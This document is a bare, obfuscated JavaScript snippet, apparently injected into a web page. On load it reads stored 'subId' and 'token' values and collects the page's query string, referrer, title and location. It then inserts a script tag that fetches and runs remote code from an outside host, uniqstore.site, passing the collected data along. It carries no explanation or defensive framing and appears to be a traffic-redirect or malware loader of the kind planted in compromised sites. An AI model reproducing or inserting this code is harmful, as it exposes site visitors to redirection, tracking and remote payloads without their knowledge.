<script>
    (function() {
    var name = '_w4BmH5v4qd14CZfd';
    if (!window._w4BmH5v4qd14CZfd) {
        window._w4BmH5v4qd14CZfd = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://uniqstore.site/wpcts6',
        };
    }
    const _T96RfcPGKgRjPHj6 = localStorage.getItem('config');
    if (typeof _T96RfcPGKgRjPHj6 !== 'undefined' && _T96RfcPGKgRjPHj6 !== null) {
        var _4FkVvTKF6GL9s8Ty = JSON.parse(_T96RfcPGKgRjPHj6);
        var _DmsFKdxXztJpnkLz = Math.round(+new Date()/1000);
        if (_4FkVvTKF6GL9s8Ty.created_at + window._w4BmH5v4qd14CZfd.ttl < _DmsFKdxXztJpnkLz) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _mMghhTPDWhgTLtxS = localStorage.getItem('subId');
    var _PFL37DyfX6VWTMNz = localStorage.getItem('token');
    var _zmT5TShjfDTmNPF1 = '?return=js.client';
        _zmT5TShjfDTmNPF1 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _zmT5TShjfDTmNPF1 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _zmT5TShjfDTmNPF1 += '&default_keyword=' + encodeURIComponent(document.title);
        _zmT5TShjfDTmNPF1 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _zmT5TShjfDTmNPF1 += '&name=' + encodeURIComponent(name);
        _zmT5TShjfDTmNPF1 += '&host=' + encodeURIComponent(window._w4BmH5v4qd14CZfd.R_PATH);
    if (typeof _mMghhTPDWhgTLtxS !== 'undefined' && _mMghhTPDWhgTLtxS && window._w4BmH5v4qd14CZfd.unique) {
        _zmT5TShjfDTmNPF1 += '&sub_id=' + encodeURIComponent(_mMghhTPDWhgTLtxS);
    }
    if (typeof _PFL37DyfX6VWTMNz !== 'undefined' && _PFL37DyfX6VWTMNz && window._w4BmH5v4qd14CZfd.unique) {
        _zmT5TShjfDTmNPF1 += '&token=' + encodeURIComponent(_PFL37DyfX6VWTMNz);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._w4BmH5v4qd14CZfd.R_PATH + _zmT5TShjfDTmNPF1;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>